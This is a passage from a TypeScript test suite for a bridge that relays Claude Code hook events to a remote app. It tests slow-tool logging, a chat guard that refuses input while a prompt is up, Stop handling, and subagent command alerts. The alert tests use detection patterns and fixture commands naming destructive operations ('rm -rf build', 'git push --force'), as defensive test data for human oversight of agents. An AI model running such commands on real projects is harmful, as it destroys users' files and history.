      configureLogger({ writeLog: (msg) => logs.push(msg) });
      build();
      lock('claude-891-fast');
      hookServer.fire('PostToolUse', {
        session_id: 'claude-891-fast',
        hook_event_name: 'PostToolUse',
        tool_name: 'Read',
        tool_input: { file_path: '/tmp/x' },
        tool_response: {},
        duration_ms: 42,
      });
      expect(logs.some((l) => l.includes('Slow tool'))).toBe(false);
    });

    test('PostToolUse does NOT log when duration_ms is absent', () => {
      const logs: string[] = [];
      configureLogger({ writeLog: (msg) => logs.push(msg) });
      build();
      lock('claude-891-nodur');
      hookServer.fire('PostToolUse', {
        session_id: 'claude-891-nodur',
        hook_event_name: 'PostToolUse',
        tool_name: 'Read',
        tool_input: { file_path: '/tmp/x' },
        tool_response: {},
      });
      expect(logs.some((l) => l.includes('Slow tool'))).toBe(false);
    });

    test('a subagent-tagged slow PostToolUse still logs (logged before the subagent early-return)', () => {
      const logs: string[] = [];
      configureLogger({ writeLog: (msg) => logs.push(msg) });
      build();
      lock('claude-891-slow-sub');
      hookServer.fire('PostToolUse', {
        session_id: 'claude-891-slow-sub',
        hook_event_name: 'PostToolUse',
        tool_name: 'Bash',
        tool_input: { command: 'sleep 10' },
        tool_response: {},
        duration_ms: 9_000,
        agent_id: 'sub-1',
      });
      const slowLines = logs.filter((l) => l.includes('Slow tool'));
      expect(slowLines.length).toBe(1);
      expect(slowLines[0]).toContain('9000ms');
    });
  });
  /**
   * #1140: the chat guard reads the tracker's observation of the menu on
   * screen, and the status pipeline used to clear it on ANY non-waiting status,
   * including a background subagent's or teammate's. Driven end to end: the
   * real bridge listeners (`setupHookBridge`), the real tracker, and the real
   * `createInputHandlers`, with the menu parsed from the live dialog bytes.
   *
   * Which agent-tagged events reach the status pipeline matters. The
   * Pre/PostToolUse/PostToolUseFailure listeners drop a subagent-tagged event
   * BEFORE any status handler (the #419 split policy), so those can never clear
   * the observation; the first test pins that. SubagentStart/SubagentStop (always
   * agent-tagged) and a teammate's Notification are forwarded to the status
   * handlers, and those are what the `agentId` threading protects.
   */
  describe('the observed menu survives a subagent and clears for the main agent (#1140)', () => {
    const CONN = 'conn-1140' as UUID;

    function lockSession(id: string): void {
      hookServer.fire('Notification', {
        session_id: id,
        hook_event_name: 'Notification',
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        notification_type: 'auth_success',
        message: '',
      });
    }

    function menuObserved(tag: string) {
      const { tracker, handle } = build({ realTracker: true });
      lockSession(tag);
      const parsed = parseQuestion(WRAPPED_DIRECTORY_DIALOG);
      if (!parsed.question) throw new Error('the live dialog did not parse as a prompt');
      tracker.onPTYPromptVisible(parsed.question);
      expect(tracker.observedPromptOptions()?.map((o) => o.value)).toEqual(['1', '2', '3']);
      sessionRegistry.attachConnection(SID, CONN);
      const sent: ProtocolMessage[] = [];
      const handlers = createInputHandlers({
        sessionRegistry,
        bindingStore,
        send: (_c, m) => {
          sent.push(m);
          return true;
        },
        ...trackerScreenDeps(() => tracker),
        ...promptUpDeps(
          () => handle.gate,
          () => tracker,
        ),
      });
      /** Chat text sent now: true when it was typed, false when refused. */
      const chat = async (text: string): Promise<boolean> => {
        const before = ptySubmits.length;
        const errorsBefore = sent.filter((m) => m.type === 'error').length;
        await handlers.onUserInput(CONN, SID, text, false);
        const typed = ptySubmits.length > before;
        const refused = sent.filter((m) => m.type === 'error').length > errorsBefore;
        expect(typed).not.toBe(refused);
        return typed;
      };
      return { tracker, chat, sent };
    }

    const tool = (tag: string, event: 'PreToolUse' | 'PostToolUse', extra: object) =>
      hookServer.fire(event, {
        session_id: tag,
        hook_event_name: event,
        tool_name: 'Bash',
        tool_use_id: `tu-${event}`,
        tool_input: { command: 'ls' },
        tool_response: {},
        ...extra,
      });

    test('a subagent PreToolUse or PostToolUse never reaches the status pipeline: chat stays refused', async () => {
      const { chat } = menuObserved('claude-1140-tools');

      tool('claude-1140-tools', 'PreToolUse', { agent_id: 'sub-1', agent_type: 'general-purpose' });
      tool('claude-1140-tools', 'PostToolUse', {
        agent_id: 'sub-1',
        agent_type: 'general-purpose',
      });

      // No status change was made at all.
      expect(messageApiLog.statusCalls).toEqual([]);
      expect(await chat('while the subagent works')).toBe(false);
      expect(ptySubmits).toEqual([]);
    });

    test('SubagentStart and SubagentStop reach the status pipeline and leave the menu observed: chat stays refused', async () => {
      const { tracker, chat } = menuObserved('claude-1140-lifecycle');

      hookServer.fire('SubagentStart', {
        session_id: 'claude-1140-lifecycle',
        agent_id: 'sub-1',
        agent_type: 'general-purpose',
      });
      // The status pipeline did see it (the message API is not filtered) ...
      expect(messageApiLog.statusCalls).toEqual(['executing']);
      // ... but the main dialog is still on screen.
      expect(tracker.observedPromptOptions()).not.toBeNull();
      expect(await chat('after the subagent started')).toBe(false);

      hookServer.fire('SubagentStop', { session_id: 'claude-1140-lifecycle', agent_id: 'sub-1' });
      expect(messageApiLog.statusCalls).toEqual(['executing', 'thinking']);
      expect(await chat('after the subagent stopped')).toBe(false);
      expect(ptySubmits).toEqual([]);
    });

    test("a teammate's idle_prompt Notification leaves the menu observed: chat stays refused", async () => {
      const { chat } = menuObserved('claude-1140-teammate');

      hookServer.fire('Notification', {
        session_id: 'claude-1140-teammate',
        hook_event_name: 'Notification',
        notification_type: 'idle_prompt',
        message: '',
        agent_id: 'team-1',
        agent_type: 'general-purpose',
      });

      expect(messageApiLog.statusCalls).toEqual(['idle']);
      expect(await chat('while the teammate idles')).toBe(false);
    });

    test('a main-agent PreToolUse (no agent_id) clears the observation: the next chat text is typed', async () => {
      const { tracker, chat } = menuObserved('claude-1140-main');
      hookServer.fire('SubagentStart', {
        session_id: 'claude-1140-main',
        agent_id: 'sub-1',
        agent_type: 'general-purpose',
      });
      expect(await chat('still refused')).toBe(false);

      tool('claude-1140-main', 'PreToolUse', {});

      expect(messageApiLog.statusCalls).toEqual(['executing', 'executing']);
      expect(tracker.observedPromptOptions()).toBeNull();
      expect(await chat('typed now')).toBe(true);
      expect(ptySubmits).toEqual(['typed now']);
    });

    test('a main-agent idle_prompt Notification clears it too', async () => {
      const { chat } = menuObserved('claude-1140-main-idle');

      hookServer.fire('Notification', {
        session_id: 'claude-1140-main-idle',
        hook_event_name: 'Notification',
        notification_type: 'idle_prompt',
        message: '',
      });

      expect(await chat('typed after idle')).toBe(true);
    });
  });

  /**
   * #1155: the chat guard and Stop read one "a prompt is up" signal
   * (`promptUpDeps`, built once in cli.ts and spread into both handler
   * factories, as here): a held main prompt, a hook-backed prompt waiting in
   * the terminal, or a numbered menu. Before it, Stop read only the screen
   * parse and typed "/exit" + Enter into a dialog the parse had not seen (or
   * that a text status had cleared), and the chat guard missed a prompt
   * released to the terminal. Real bridge, gate, tracker, MessageAPI and
   * both handler factories; the PTY records every keystroke.
   */
  describe('Stop and chat read one "a prompt is up" signal (#1155)', () => {
    const CONN = 'conn-1155' as UUID;
    const REQ = 'req-1155' as UUID;

    function lockSession(id: string): void {
      hookServer.fire('Notification', {
        session_id: id,
        hook_event_name: 'Notification',
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        notification_type: 'auth_success',
        message: '',
      });
    }

    /** The chat and Stop handlers, wired as cli.ts wires them. */
    function handlersFor(built: { tracker: QuestionPresenceTracker; handle: HookBridgeHandle }) {
      const sent: ProtocolMessage[] = [];
      const send = (_c: UUID, m: ProtocolMessage) => {
        sent.push(m);
        return true;
      };
      const promptUpWiring = promptUpDeps(
        () => built.handle.gate,
        () => built.tracker,
      );
      const input = createInputHandlers({
        sessionRegistry,
        bindingStore,
        send,
        ...gateAnswerDeps(() => built.handle.gate),
        ...trackerScreenDeps(() => built.tracker),
        ...promptUpWiring,
      });
      const session = createSessionHandlers({
        sessionRegistry,
        bindingStore,
        transcriptDiscovery: new TranscriptDiscovery({
          projectsDir: path.join(tmpDir, 'claude-projects'),
        }),
        harness: new ClaudeHarness(
          new TranscriptDiscovery({ projectsDir: path.join(tmpDir, 'claude-projects') }),
        ),
        liveSessionsRegistry,
        currentPort: () => 8765,
        untrackConnection: () => {},
        onConnectionRemoved: () => {},
        send,
        ...promptUpWiring,
        exitFallbackMs: 60_000,
      });
      sessionRegistry.attachConnection(SID, CONN);
      /** The refusal sent for the last chat text, if any. */
      const refusal = () =>
        sent.filter((m) => m.type === 'error').at(-1) as
          | { code?: string; message?: string }
          | undefined;
      return { input, session, sent, refusal };
    }

    const bashCall = (session: string, command: string) => ({
      session_id: session,
      hook_event_name: 'PermissionRequest',
      tool_name: 'Bash',
      tool_input: { command },
    });

    test('a held main prompt the screen parse has not seen: chat refused, Stop types nothing and force-closes', async () => {
      const built = build({ realTracker: true, realMessageApi: true, liveQuestionDeps: true });
      lockSession('claude-1155-held');
      const hook = hookServer.firePermission(bashCall('claude-1155-held', 'touch held.txt'));
      // Only the hold says a dialog is up: nothing was observed on screen.
      expect(built.tracker.observedPromptOptions()).toBeNull();
      const { input, session, refusal } = handlersFor(built);

      await input.onUserInput(CONN, SID, 'please go ahead', false);
      expect(refusal()?.code).toBe('PROMPT_WAITING');
      expect(refusal()?.message).toBe(PROMPT_WAITING_HELD_MESSAGE);

      session.onKillSessionRequest(CONN, SID, REQ);
      expect(ptySubmits).toEqual([]);
      expect(sessionRegistry.getSession(SID)).toBeUndefined();

      built.handle.closeBinder();
      expect(await hook).toBe('passthrough');
    });

    test('a prompt released to the terminal at its deadline: chat refused (answer in the terminal), Stop force-closes', async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const built = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        holdMs: 200,
        noticeLog,
      });
      lockSession('claude-1155-deadline');
      const hook = hookServer.firePermission(bashCall('claude-1155-deadline', 'touch late.txt'));
      // The deadline releases the hold; Claude's dialog stays up.
      expect(await hook).toBe('passthrough');
      expect(noticeLog.map((n) => n.reason)).toEqual(['hold_deadline']);
      expect(built.handle.gate.hasMainHold()).toBe(false);
      expect(built.tracker.observedPromptOptions()).toBeNull();
      const { input, session, refusal } = handlersFor(built);

      await input.onUserInput(CONN, SID, 'are you there?', false);
      expect(refusal()?.code).toBe('PROMPT_WAITING');
      expect(refusal()?.message).toBe(PROMPT_WAITING_TERMINAL_MESSAGE);

      session.onKillSessionRequest(CONN, SID, REQ);
      expect(ptySubmits).toEqual([]);
      expect(sessionRegistry.getSession(SID)).toBeUndefined();
    });

    test("a background agent's dialog in a terminal session, its parse cleared by a text status: chat refused, Stop force-closes", async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const built = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        orphanDebounceMs: 5,
        noticeLog,
      });
      lockSession('claude-1155-sub');
      expect(
        await hookServer.firePermission({
          ...bashCall('claude-1155-sub', 'rm -rf build'),
          agent_id: 'agent-bg',
          agent_type: 'code-reviewer',
        }),
      ).toBe('passthrough');
      built.tracker.onOrphanPTYPrompt(parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question);
      expect(noticeLog.map((n) => n.reason)).toEqual(['subagent']);
      // A PTY-parsed status is a text guess: it clears the observation while
      // the dialog is still up (AGENTS.md, chat guard limit 3).
      built.tracker.onStatusChange('thinking');
      expect(built.tracker.observedPromptOptions()).toBeNull();
      const { input, session, refusal } = handlersFor(built);

      await input.onUserInput(CONN, SID, 'status?', false);
      expect(refusal()?.message).toBe(PROMPT_WAITING_TERMINAL_MESSAGE);

      session.onKillSessionRequest(CONN, SID, REQ);
      expect(ptySubmits).toEqual([]);
      expect(sessionRegistry.getSession(SID)).toBeUndefined();
    });

    test('nothing up (a held prompt answered from the phone): chat is typed and Stop types /exit', async () => {
      const built = build({ realTracker: true, realMessageApi: true, liveQuestionDeps: true });
      lockSession('claude-1155-none');
      const hook = hookServer.firePermission(bashCall('claude-1155-none', 'touch ok.txt'));
      const { input, session, sent } = handlersFor(built);
      const card = [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])][0];
      if (!card) throw new Error('the held prompt pushed no card');
      expect(await input.relayAnswer(SID, card.id, 'Yes')).toBe('delivered');
      expect(await hook).toBe('allow');

      await input.onUserInput(CONN, SID, 'thanks', false);
      session.onKillSessionRequest(CONN, SID, REQ);
      expect(sent.filter((m) => m.type === 'error')).toEqual([]);
      expect(ptySubmits).toEqual(['thanks', '/exit']);
      expect(sessionRegistry.getSession(SID)).toBeDefined();
    });

    /** A main prompt released to the terminal at its hold deadline, with
     *  nothing observed on screen. */
    async function releasedToTerminal(tag: string) {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const built = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        holdMs: 300,
        noticeLog,
      });
      lockSession(tag);
      expect(await hookServer.firePermission(bashCall(tag, 'touch esc.txt'))).toBe('passthrough');
      expect(noticeLog.map((n) => n.reason)).toEqual(['hold_deadline']);
      return { ...built, noticeLog, ...handlersFor(built) };
    }

    test('the refusal for a prompt in the terminal names every way out', async () => {
      const { input, refusal } = await releasedToTerminal('claude-1155-message');
      await input.onUserInput(CONN, SID, 'hello?', false);
      expect(refusal()?.message).toBe(
        'Claude is waiting on a prompt in the terminal. Answer it there, press Esc from the app, or run remi unstick.',
      );
    });

    test('a bare Esc from the app clears a main prompt handed to the terminal: chat is typed, Stop types /exit', async () => {
      const { input, session, refusal, noticeLog } = await releasedToTerminal('claude-1155-esc');
      await input.onUserInput(CONN, SID, 'first', false);
      expect(refusal()?.message).toBe(PROMPT_WAITING_TERMINAL_MESSAGE);

      // The web Esc button, Telegram /interrupt and an attach Esc key all
      // send exactly this raw input.
      await input.onUserInput(CONN, SID, '\x1b', true);
      expect(ptySubmits).toEqual(['write:\x1b']);
      // The prompt is resolved: its "answer at the terminal" notice goes.
      expect(noticeLog.map((n) => n.reason)).toEqual(['hold_deadline', 'dismissed']);

      await input.onUserInput(CONN, SID, 'second', false);
      session.onKillSessionRequest(CONN, SID, REQ);
      expect(ptySubmits).toEqual(['write:\x1b', 'second', '/exit']);
    });

    test('an arrow key is not a dismissal: the prompt keeps refusing chat', async () => {
      const { input, refusal } = await releasedToTerminal('claude-1155-arrow');
      await input.onUserInput(CONN, SID, '\x1b[B', true);
      await input.onUserInput(CONN, SID, 'still there?', false);
      expect(ptySubmits).toEqual(['write:\x1b[B']);
      expect(refusal()?.message).toBe(PROMPT_WAITING_TERMINAL_MESSAGE);
    });

    test('remi unstick clears a prompt handed to the terminal', async () => {
      const { input, handle } = await releasedToTerminal('claude-1155-unstick');
      handle.gate.forceRelease('test');
      await input.onUserInput(CONN, SID, 'after unstick', false);
      expect(ptySubmits).toEqual(['after unstick']);
    });

    test("an Esc leaves a subagent's dialog in the terminal alone (main prompts only)", async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const built = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        orphanDebounceMs: 5,
        noticeLog,
      });
      lockSession('claude-1155-sub-esc');
      await hookServer.firePermission({
        ...bashCall('claude-1155-sub-esc', 'rm -rf build'),
        agent_id: 'agent-bg',
        agent_type: 'code-reviewer',
      });
      built.tracker.onOrphanPTYPrompt(parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question);
      built.tracker.onStatusChange('thinking');
      const { input, refusal } = handlersFor(built);
      await input.onUserInput(CONN, SID, '\x1b', true);
      await input.onUserInput(CONN, SID, 'status?', false);
      expect(ptySubmits).toEqual(['write:\x1b']);
      expect(refusal()?.message).toBe(PROMPT_WAITING_TERMINAL_MESSAGE);
      expect(noticeLog.map((n) => n.reason)).toEqual(['subagent']);
    });
  });

  /**
   * #1155: the subagent alert is fed from the tool hooks, not from
   * `PermissionRequest`. A call the session's allow rules permit fires no
   * `PermissionRequest` (measured, ADR 0031), which is exactly the silent
   * case the alert exists for; a call that prompts gets its notice (terminal
   * session) or held card (daemon or hub) and never an alert as well. Real
   * bridge, gate, tracker and `SubagentAlerter`; the sink records what would
   * be pushed.
   */
  describe('subagent alerts come from the tool hooks (#1155)', () => {
    const PATTERNS = ['rm -rf', 'push --force'];

    function lockSession(id: string): void {
      hookServer.fire('Notification', {
        session_id: id,
        hook_event_name: 'Notification',
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        notification_type: 'auth_success',
        message: '',
      });
    }

    function alerting(opts: Parameters<typeof build>[0] = {}) {
      const alerts: SubagentAlert[] = [];
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const built = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        orphanDebounceMs: 5,
        noticeLog,
        subagentAlerts: {
          alerter: new SubagentAlerter(PATTERNS),
          deliver: (alert) => alerts.push(alert),
        },
        ...opts,
      });
      return { ...built, alerts, noticeLog };
    }

    const call = (session: string, command: string, toolUseId: string, agent = true) => ({
      session_id: session,
      tool_name: 'Bash',
      tool_input: { command },
      tool_use_id: toolUseId,
      ...(agent ? { agent_id: 'agent-bg', agent_type: 'code-reviewer' } : {}),
    });

    /** An allowlisted call: Claude fires PreToolUse, runs it, PostToolUse. */
    function runsSilently(c: ReturnType<typeof call>, event = 'PostToolUse'): void {
      hookServer.fire('PreToolUse', { ...c, hook_event_name: 'PreToolUse' });
      hookServer.fire(event, { ...c, hook_event_name: event, tool_response: {} });
    }

    test('wrapper mode: an allowlisted call matching a pattern pushes one alert, when it finishes', () => {
      const { alerts } = alerting();
      lockSession('claude-alert-allowed');
      const c = call('claude-alert-allowed', 'rm -rf build', 'tu-allowed');
      hookServer.fire('PreToolUse', { ...c, hook_event_name: 'PreToolUse' });
      // A prompt could still follow: nothing yet.
      expect(alerts).toEqual([]);
      hookServer.fire('PostToolUse', { ...c, hook_event_name: 'PostToolUse', tool_response: {} });
      expect(alerts).toEqual([
        {
          pattern: 'rm -rf',
          toolName: 'Bash',
          detail: 'rm -rf build',
          agentId: 'agent-bg',
          agentType: 'code-reviewer',
        },
      ]);
    });

    test('a call that fails still ran: PostToolUseFailure alerts too', () => {
      const { alerts } = alerting();
      lockSession('claude-alert-failed');
      runsSilently(
        call('claude-alert-failed', 'git push --force', 'tu-failed'),
        'PostToolUseFailure',
      );
      expect(alerts.map((a) => a.pattern)).toEqual(['push --force']);
    });

    test('an allowlisted call matching no pattern pushes nothing; neither does a main-agent call', () => {
      const { alerts } = alerting();
      lockSession('claude-alert-none');
      runsSilently(call('claude-alert-none', 'ls -la', 'tu-ls'));
      runsSilently(call('claude-alert-none', 'rm -rf build', 'tu-main', false));
      expect(alerts).toEqual([]);
    });

    test('wrapper mode: a call that prompts gets only its render notice, never an alert as well', async () => {
      const { alerts, noticeLog, tracker } = alerting();
      lockSession('claude-alert-prompted');
      const c = call('claude-alert-prompted', 'rm -rf build', 'tu-prompted');
      hookServer.fire('PreToolUse', { ...c, hook_event_name: 'PreToolUse' });
      const { tool_use_id: _none, ...request } = c;
      expect(
        await hookServer.firePermission({ ...request, hook_event_name: 'PermissionRequest' }),
      ).toBe('passthrough');
      tracker.onOrphanPTYPrompt(parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question);
      expect(noticeLog.map((n) => n.reason)).toEqual(['subagent']);
      // Answered Yes in the terminal: the tool runs and finishes.
      hookServer.fire('PostToolUse', { ...c, hook_event_name: 'PostToolUse', tool_response: {} });
      expect(noticeLog.map((n) => n.reason)).toEqual(['subagent', 'dismissed']);
      expect(alerts).toEqual([]);
    });

    test('daemon mode: an allowlisted call alerts; a prompting one is a held card and no alert', async () => {
      const { alerts, handle } = alerting({ hasLocalTerminal: false });
      lockSession('claude-alert-daemon');
      runsSilently(call('claude-alert-daemon', 'rm -rf dist', 'tu-daemon-allowed'));
      expect(alerts.map((a) => a.detail)).toEqual(['rm -rf dist']);

      const c = call('claude-alert-daemon', 'rm -rf build', 'tu-daemon-prompted');
      hookServer.fire('PreToolUse', { ...c, hook_event_name: 'PreToolUse' });
      const { tool_use_id: _none, ...request } = c;
      const hook = hookServer.firePermission({ ...request, hook_event_name: 'PermissionRequest' });
      const card = [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])][0];
      if (!card) throw new Error('the held subagent prompt pushed no card');
      expect(
        handle.gate.answerHeld(card.id, {
          kind: 'option',
          option: card.options[0] as QuestionOption,
        }),
      ).toBe('resolved');
      expect(await hook).toBe('allow');
      hookServer.fire('PostToolUse', { ...c, hook_event_name: 'PostToolUse', tool_response: {} });
      expect(alerts.map((a) => a.detail)).toEqual(['rm -rf dist']);
    });

    test('a call Claude refused (PermissionDenied) never alerts', () => {
      const { alerts } = alerting();
      lockSession('claude-alert-denied');
      const c = call('claude-alert-denied', 'rm -rf build', 'tu-denied');
      hookServer.fire('PreToolUse', { ...c, hook_event_name: 'PreToolUse' });
      hookServer.fire('PermissionDenied', {
        ...c,
        hook_event_name: 'PermissionDenied',
        reason: 'blocked by the auto mode classifier',
      });
      // Even a stray finish for the same id would not alert now.
      hookServer.fire('PostToolUse', { ...c, hook_event_name: 'PostToolUse', tool_response: {} });
      expect(alerts).toEqual([]);
    });
  });
});
